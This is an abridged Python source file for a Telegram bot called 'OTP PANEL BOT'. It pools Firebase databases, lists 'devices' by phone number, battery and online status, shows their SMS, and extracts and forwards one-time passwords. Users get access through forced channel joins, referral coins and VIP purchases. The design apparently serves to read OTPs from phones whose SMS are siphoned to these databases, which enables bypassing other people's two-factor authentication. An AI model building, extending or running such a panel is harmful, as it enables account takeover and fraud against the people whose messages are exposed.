#!/usr/bin/env python3
"""
OTP PANEL BOT — v5.0 STRICT FORCE-JOIN EDITION
· Fail-closed channel check (same as bot(1).py)
· No admin bypass — everyone must join
· No-delete policy · /activeurls download
"""
...
async def get_http_session() -> aiohttp.ClientSession:
    ...
    if _http_session is None or _http_session.closed:
        ...
        _http_session = aiohttp.ClientSession(
            ...
            headers={"User-Agent": "OTPPanelBot/5.0"},
        )
...
# ════════════════════════════════════════════════════════════
#  ✅ STRICT FORCE-JOIN — FAIL-CLOSED
#  (Exact same logic as your working bot(1).py)
# ════════════════════════════════════════════════════════════

async def check_membership(bot_token, bot, user_id: int) -> list[str]:
    """Return list of channels user has NOT joined.

    FAIL-CLOSED: if the API call fails for any reason,
    the user is treated as NOT JOINED → they get blocked.
    Same as your working bot(1).py logic.
    """
    ...
    for ch in REQUIRED_CHANNELS:
        try:
            ...
            # ✅ Same check as bot(1).py
            if status not in ("member", "administrator", "creator"):
                not_joined.append(ch["username"])
        except Exception as e:
            # ✅ FAIL-CLOSED — same as bot(1).py "return False"
            tlog(f"⚠️ check_join failed for @{ch['username']}: {e}")
            not_joined.append(ch["username"])
    return not_joined
...
def build_join_keyboard() -> InlineKeyboardMarkup:
    ...
    buttons.append([
        InlineKeyboardButton("✅ I Have Joined (Check)", callback_data="check_join")
    ])
...
def build_join_text() -> str:
    ...
    for ch in REQUIRED_CHANNELS:
        text += f"• <b>{ch['name']}</b>\n  {ch['url']}\n"
    text += "\n✅ Sabhi channels join karne ke baad <b>'I Have Joined'</b> button dabayein."
    return text


async def send_join_prompt(source) -> None:
    """Send join keyboard. Works with Update or Message."""
...
async def send_join_prompt_to_bot(bot, chat_id: int) -> None:
    """Send join prompt directly to a chat (for callback context)."""
    try:
...
async def get_all_devices(bot_token: str, user_id: Optional[int] = None) -> list:
...
async def get_device_sms(device, limit: int = SMS_LIMIT) -> list:
...
def device_list_header(devices: list, page: int = 0) -> str:
...
def device_list_keyboard(devices: list, page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
...
def online_only_keyboard(devices: list) -> InlineKeyboardMarkup:
...
async def _private_dbs_view(chat_id: int) -> tuple:
    ...
    if is_main_bot and not users_db.get(chat_id, {}).get("bonus_10_received"):
        ...
        try:
            await ctx.bot.send_message(
                ...
                "Ab sirf <b>1 refer</b> (10 coins) aur karo!",
                parse_mode="HTML")
        except Exception:
            pass


def _bot_context(ctx, chat_id: int):
...
# ════════════════════════════════════════════════════════════
#  /start  — STRICT force-join (even for admins)
# ════════════════════════════════════════════════════════════
...
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if chat_id not in users_db:
        ...
        if is_main_bot and ref_id and ref_id in users_db and ref_id != chat_id:
            ...
            try:
                await ctx.bot.send_message(
                    ref_id, "🎉 New referral! +10 Coins added.")
            except Exception:
                pass

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    # ✅ STRICT FORCE-JOIN — EVERYONE must join, even admins
    if is_main_bot:
...
async def cmd_recent(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if row:
        btn_rows.append(row)
    btn_rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
...
async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if not is_admin:
        try:
            await update.message.reply_text("ℹ️ Admin only.")
        except TelegramError:
            pass
        return
...
async def cmd_activeurls(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if not rows:
        try:
            await update.message.reply_text("📭 No active URLs found.")
        except TelegramError:
            pass
        return
    ...
    for i, r in enumerate(rows[:30], 1):
        ...
        lines.append(
            ...
            f"     [{r['source']}] {r['name']} — {r['devices']} dev"
        )
    if len(rows) > 30:
        lines.append(f"\n…+{len(rows) - 30} more (in .txt)")
...
def _leaderboard_text(users_db: dict) -> str:
    ...
    if len(lines) == 2:
        lines.append("Abhi koi data nahi!")
    lines.append("━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)
...
# ════════════════════════════════════════════════════════════
#  on_command  — STRICT force-join for admin commands too
# ════════════════════════════════════════════════════════════
...
async def on_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    # ✅ STRICT force-join (even admins) for main bot
    if is_main_bot:
        not_joined = await check_membership(bot_token, ctx.bot, chat_id)
        if not_joined:
...
# ════════════════════════════════════════════════════════════
#  on_callback  — STRICT force-join (except check_join/close_msg)
# ════════════════════════════════════════════════════════════
...
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if users_db.get(chat_id, {}).get("banned"):
        await safe_answer(query, "🚫 You are banned.", show_alert=True)
        return
    ...
    if data != "noop" and user_guards.is_rate_limited(chat_id):
        await safe_answer(query, "⚠️ Slow down!", show_alert=False)
        return

    # ✅ STRICT FORCE-JOIN — every callback except check_join/close_msg/noop
    _bypass = {"noop", "close_msg", "check_join"}
    if (is_main_bot
            and data not in _bypass
            and not data.startswith("admin_")
            and not data.startswith("priv_")
            and not data.startswith("activeurls_")):
        not_joined = await check_membership(bot_token, ctx.bot, chat_id)
        if not_joined:
            users_db.setdefault(chat_id, {})["verified"] = False
            await safe_answer(
                query,
                "🚨 Aapne channel leave kar diya hai!\nPehle saare channels join karein.",
                show_alert=True)
            try:
                if query.message:
    ...
    try:
        await _dispatch_callback(query, ctx, data, chat_id, bot_token,
                                 users_db, is_admin, is_main_bot)
    except (BadRequest, Forbidden, RetryAfter, TimedOut) as e:
        tlog(f"Callback error [{data}]: {e}")
        await safe_answer(query, "⚠️ Try again.", show_alert=False)
    except Exception as e:
        tlog(f"❌ Callback error [{data}]: {e}")
        await safe_answer(query, "⚠️ Error, try again.", show_alert=False)
    finally:
...
async def _dispatch_callback(query, ctx, data: str, chat_id: int, bot_token: str,
    ...
    if data == "check_join":
        ...
        if not_joined:
            ...
            await safe_answer(
                ...
                f"Pehle saare channels join karein.",
                show_alert=True)
            return
        users_db.setdefault(chat_id, {})["verified"] = True
        chats_registry.setdefault(bot_token, set()).add(chat_id)
        ...
        try:
            await ctx.bot.send_message(
                ...
                "━━━━━━━━━━━━━━━━━━\n"
                "Welcome! Ab aap saare features use kar sakte hain.\n\n"
    ...
    if data == "recent_refresh":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await safe_edit(query, "🔑 Use <code>/recent</code> again.",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
        return
    ...
    if data == "buy_vip":
        if not is_main_bot:
            await safe_answer(query, "VIP on main bot only.", show_alert=True)
            return
        ...
        banner = (f"👑 <b>VIP ACTIVATED!</b>\n"
                  f"Aapko <b>{VIP_DURATION_HOURS} hours</b> VIP mil gaya!\n"
                  f"💰 Coins left: <b>{users_db[chat_id]['coins']}</b>\n"
                  f"⏱ Valid: <b>{remaining}</b>\n\n")
        if not devices:
    ...
    if data == "activeurls_download" and is_admin:
        rows = collect_active_urls()
        if not rows:
            await safe_answer(query, "No URLs.", show_alert=True)
            return
        ...
        try:
            await ctx.bot.send_document(
                ...
                caption=f"🌐 <b>Active URLs</b>\n📊 {len(rows)} unique URLs",
                parse_mode="HTML")
            await safe_answer(query, "📥 Sent!", show_alert=False)
        except Exception as e:
            tlog(f"download failed: {e}")
            await safe_answer(query, f"❌ {str(e)[:80]}", show_alert=True)
        return

    if data == "activeurls_refresh" and is_admin:
        rows = collect_active_urls()
        if not rows:
            await safe_edit(query, "📭 No active URLs.")
            return
        lines = ["🌐 <b>ACTIVE URLs</b>", "━━━━━━━━━━━━━━━━━━"]
        for i, r in enumerate(rows[:30], 1):
            icon = "🟢" if r["online"] > 0 else "🔴"
            lines.append(f"{i}. {icon} <code>{r['url']}</code>")
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📥 Download .txt", callback_data="activeurls_download")],
            [InlineKeyboardButton("❌ Close", callback_data="close_msg")],
        ])
    ...
    if data == "priv_add":
        ...
        await safe_edit(query,
            ...
            "Apna Firebase URL bhejein, ya .txt file upload karein.\n\n"
            "♾️ Unlimited DBs.\n🔒 Cannot be deleted.\n\n"
    ...
    if data.startswith("priv_open:"):
        ...
        for d in devs[:20]:
            ...
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
        if not rows:
            rows.append([InlineKeyboardButton("😴 No devices", callback_data="noop")])
    ...
    if data == "admin_add_firebase" and is_admin and is_main_bot:
        ...
        await safe_edit(query,
            ...
            "Ek ya zyada URLs bhejein — har URL naye line par.\n"
            "Ya .txt file upload karein.\n\n❌ Cancel: /cancel",
            reply_markup=InlineKeyboardMarkup([
    ...
    if data.startswith("msgs:"):
        ...
        otp_buttons.append([InlineKeyboardButton("🔙 Back",
    ...
    if data.startswith("info:"):
        ...
        status = "🟢 Online" if device.status == "online" else "🔴 Offline"
        bat = f"{bat_emoji(device.battery)} {device.battery}%"
        text = (f"ℹ️ <b>DEVICE</b>\nNumber: <b>{label}</b>\n"
                f"Status: {status}\nBattery: {bat}\n"
                f"Server: <code>{device.db_tag}</code>\n")
        if device.device_info:
            text += f"\n{device.device_info}\n"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 Messages", callback_data=f"msgs:{dev_id}"),
...
async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
    ...
    if cmd == "/help":
        help_text = (
            ...
            "🔒 <i>Firebase URLs cannot be deleted. Permanent policy.</i>"
        )
    ...
    if cmd == "/all":
        ...
        wait = await update.message.reply_text(
            f"⏳ {len(users_db)} users ko {amount} coins...")
            ...
            try:
                async with _send_sem:
                    await send_bot.send_message(
                        ...
                        f"Aapko <b>{amount} Coins</b> mil gaye!\n"
    ...
    if cmd == "/broadcast":
        ...
        if not targets:
            ...
            return True
        wait = await update.message.reply_text(f"⏳ Broadcasting...")
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)
    ...
    if cmd == "/adddb":
        ...
        if len(urls) > 1:
            ...
            lines.append(f"Total DBs: {len(DATABASES)}")
            await wait.edit_text("\n".join(lines), parse_mode="HTML")
            return True
        if len(args) < 2:
            await reply("⚠️ Usage: <code>/adddb Name https://...</code>", parse_mode="HTML")
            return True
        name = args[0].strip()
        url = args[1].strip()
...
async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if not fname.endswith(".txt"):
        try:
            await update.message.reply_text(
                "⚠️ Sirf <b>.txt</b> file upload karein.",
                parse_mode="HTML")
        except TelegramError:
            pass
        return
    ...
    if action == "add_private_db":
        ...
        lines.append(f"📊 Total private DBs: <b>{len(PRIVATE_DBS.get(chat_id, []))}</b>")
        result_text = "\n".join(lines)
    ...
    pending_action.pop(chat_id)
    try:
        await wait.edit_text(f"⏳ Importing {len(urls)} database(s)…")
    except TelegramError:
        pass
...
# ════════════════════════════════════════════════════════════
#  TEXT HANDLER — STRICT force-join on menu buttons
# ════════════════════════════════════════════════════════════
...
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    # ── Menu buttons that REQUIRE strict force-join ────────
    is_menu_action = (
        text == "📱 Devices List"
        or text == "🔍 Search Number"
        or text == "🔐 Private OTP"
        or text.startswith("🤖 Create Your Bot")
        or text == "💸 Refer & Earn"
    )

    # Commands and mid-flow are exempt
    is_bypass = (
        text.lower() in ("/cancel", "cancel")
        or text.startswith("/")
        or (chat_id in pending_action)
    )

    if is_main_bot and is_menu_action and not is_bypass:
        not_joined = await check_membership(bot_token, ctx.bot, chat_id)
        if not_joined:
            users_db.setdefault(chat_id, {})["verified"] = False
            await send_join_prompt(update)
    ...
    if action == "add_private_db":
        ...
        for u in urls:
            ...
            if ok:
                ...
                lines.append(f"❌ {name}")
        lines.append(f"📊 Total: <b>{len(PRIVATE_DBS.get(chat_id, []))}</b>")
        try:
            await wait.edit_text(
                "\n".join(lines), parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
    ...
    if action == "add_firebase_main" and is_admin and is_main_bot:
        ...
        if not urls:
            try:
                await update.message.reply_text(
                    "⚠️ Koi valid URL nahi mila.", parse_mode="HTML")
            except TelegramError:
                pass
            return
        wait = await update.message.reply_text(f"⏳ Adding {len(urls)}...")
        added, failed = await bulk_add_databases(urls, user_id=chat_id)
        lines = ["✅ <b>DONE</b>"]
        for name, cnt in added:
            lines.append(f"🗄 <b>{name}</b> — {cnt} devices")
    ...
    if action == "broadcast_msg" and is_admin:
        pending_action.pop(chat_id)
        targets = chats_registry.get(bot_token, set())
        wait_msg = await update.message.reply_text(f"⏳ Broadcasting...")
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)
...
async def _forward_sms(device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body:
        return
    label = device_label(device)
...
async def start_web_server():
    ...
    web_app.add_routes([
        web.get('/', _web_root),
        web.get('/healthcheck', _web_health),
    ])
...
def main() -> None:
    ...
    print("═" * 60)
    print("  🤖 OTP PANEL BOT — v5.0 STRICT FORCE-JOIN EDITION")
    print("  🚪 Force-join on every action (no bypass)")
